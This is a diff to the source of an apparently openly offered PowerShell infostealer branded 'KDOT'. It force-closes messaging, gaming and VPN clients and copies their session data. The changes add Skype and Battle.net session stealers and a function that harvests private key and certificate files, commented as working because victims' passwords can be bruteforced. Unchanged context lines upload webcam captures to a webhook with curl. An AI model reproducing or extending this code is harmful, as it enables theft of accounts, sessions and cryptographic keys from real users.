@@ -1,4 +1,4 @@
-$debug = $true
+$debug = $false
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -224,6 +224,7 @@ function HOSTS-BLOCKER {
 }
 
 
+
 function Request-Admin {
     while (-not (INVOKE-AC)) {
         try {
@@ -259,7 +260,7 @@ function Backup-Data {
     }
 
     #bulk data (added build ID with banner)
-    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org").ip
+    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org")
     $lang = (Get-WinUserLanguageList).LocalizedName
     $date = Get-Date -Format "r"
     $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
@@ -382,7 +383,7 @@ function Backup-Data {
         $processname = "telegram"
         $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
         if (!(Test-Path $pathtele)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $destination = "$folder_messaging\Telegram.zip"
         $exclude = @("_*.config", "temp", "dumps", "tdummy", "emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6", "*.json", "webview")
         $files = Get-ChildItem -Path $pathtele -Exclude $exclude
@@ -395,7 +396,7 @@ function Backup-Data {
         $processname = "element"
         $elementfolder = "$env:userprofile\AppData\Roaming\Element"
         if (!(Test-Path $elementfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname  | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $element_session = "$folder_messaging\Element"
         New-Item -ItemType Directory -Force -Path $element_session
         Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force 
@@ -423,7 +424,7 @@ function Backup-Data {
         $processname = "signal"
         $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
         if (!(Test-Path $signalfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $signal_session = "$folder_messaging\Signal"
         New-Item -ItemType Directory -Force -Path $signal_session
         Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
@@ -439,7 +440,7 @@ function Backup-Data {
         $processname = "viber"
         $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
         if (!(Test-Path $viberfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue') { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $viber_session = "$folder_messaging\Viber"
         New-Item -ItemType Directory -Force -Path $viber_session
         $configfiles = @("config$1")
@@ -466,7 +467,7 @@ function Backup-Data {
     # Whatsapp Session Stealer
     function whatsappstealer {
         $processname = "whatsapp"
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $whatsapp_session = "$folder_messaging\Whatsapp"
         New-Item -ItemType Directory -Force -Path $whatsapp_session
         $regexPattern = "WhatsAppDesktop"
@@ -479,6 +480,16 @@ function Backup-Data {
             }
         }
     }
+	
+	function skype_stealer {
+        $processname = "skype"
+        $skypefolder = "$env:appdata\microsoft\skype for desktop"
+        if (!(Test-Path $skypefolder)) { return }
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
+        $skype_session = "$folder_messaging\Skype"
+        New-Item -ItemType Directory -Force -Path $skype_session
+        Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
+    }
 
     # All Gaming Sessions
     # Steam Session Stealer
@@ -486,7 +497,7 @@ function Backup-Data {
         $processname = "steam"
         $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
         if (!(Test-Path $steamfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $steam_session = "$folder_gaming\Steam"
         New-Item -ItemType Directory -Force -Path $steam_session
         Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
@@ -539,7 +550,7 @@ function Backup-Data {
         if (!(Test-Path $eafolder)) { return }
         $ea_session = "$folder_gaming\Electronic Arts"
         if (!(Test-Path $ea_session)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         New-Item -ItemType Directory -Force -Path $ea_session
         Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
     }
@@ -550,12 +561,24 @@ function Backup-Data {
         $growtopiafolder = "$env:localappdata\Growtopia"
         if (!(Test-Path $growtopiafolder)) { return }
         $growtopia_session = "$folder_gaming\Growtopia"
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         New-Item -ItemType Directory -Force -Path $growtopia_session
         Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
     }
-
-
+    
+	function battle_net_stealer {
+            $processnames = @("Battle.net","Agent")
+            $battle_folder = "$env:appdata\Battle.net"
+            if (!(Test-Path $battle_folder)) { return }
+            foreach ($process in $processnames){Stop-Process -Name $process -ErrorAction 'SilentlyContinue' -Force}
+            $battle_session = "$folder_gaming\Battle.net"
+            New-Item -ItemType Directory -Force -Path $battle_session
+            $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
+            foreach ($file in $files) {
+               Copy-Item -Path $file.FullName -Destination $battle_session
+            }
+    }
+	
     # All VPN Sessions
 
     # NordVPN 
@@ -563,7 +586,7 @@ function Backup-Data {
         $processname = "nordvpn"
         $nordvpnfolder = "$env:localappdata\nordvpn"
         if (!(Test-Path $nordvpnfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $nordvpn_account = "$folder_vpn\NordVPN"
         New-Item -ItemType Directory -Force -Path $nordvpn_account
         $pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
@@ -587,7 +610,7 @@ function Backup-Data {
         $processname = "protonvpn"
         $protonvpnfolder = "$env:localappdata\protonvpn"  
         if (!(Test-Path $protonvpnfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $protonvpn_account = "$folder_vpn\ProtonVPN"
         New-Item -ItemType Directory -Force -Path $protonvpn_account
         $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
@@ -610,7 +633,7 @@ function Backup-Data {
         $processname = "Surfshark"
         $surfsharkvpnfolder = "$env:appdata\Surfshark"
         if (!(Test-Path $surfsharkvpnfolder)) { return }
-        try { if (Get-Process $processname -ErrorAction 'SilentlyContinue' ) { Get-Process -Name $processname | Stop-Process -ErrorAction 'SilentlyContinue' -Force } } catch {}
+        try {(Get-Process -Name $processname -ErrorAction 'SilentlyContinue' | Stop-Process -Force  )} catch {} 
         $surfsharkvpn_account = "$folder_vpn\Surfshark"
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
@@ -624,12 +647,14 @@ function Backup-Data {
         signalstealer
         viberstealer
         whatsappstealer
+		skype_stealer
         steamstealer
         minecraftstealer
         epicgames_stealer
         ubisoftstealer
         electronic_arts
         growtopiastealer
+		battle_net_stealer
         nordvpnstealer
         protonvpnstealer
         surfsharkvpnstealer		
@@ -771,7 +796,21 @@ function Backup-Data {
         curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\KDOT\$name\`"" $webhook | out-null
         Remove-Item -Path "$env:APPDATA\KDOT\$name" -Force
     }
-
+    
+	# Works since most victims will have a weak password which can be bruteforced
+    function ExportPrivateKeys {
+    $privatekeysfolder = "$important_files\Certificates & Private Keys"
+    New-Item -ItemType Directory -Path $privatekeysfolder -Force
+    $sourceDirectory = $env:HOMEPATH
+    $destinationDirectory = "$important_files\Certificates & Private Keys"
+    $fileExtensions = @("*.pem","*.ppk","*.key","*.pfx")
+    $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
+    foreach ($file in $foundFiles) {
+        Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force
+    }
+    }
+    ExportPrivateKeys
+	
 	Function Invoke-GrabFiles {
         $grabber = @(
             "2fa",
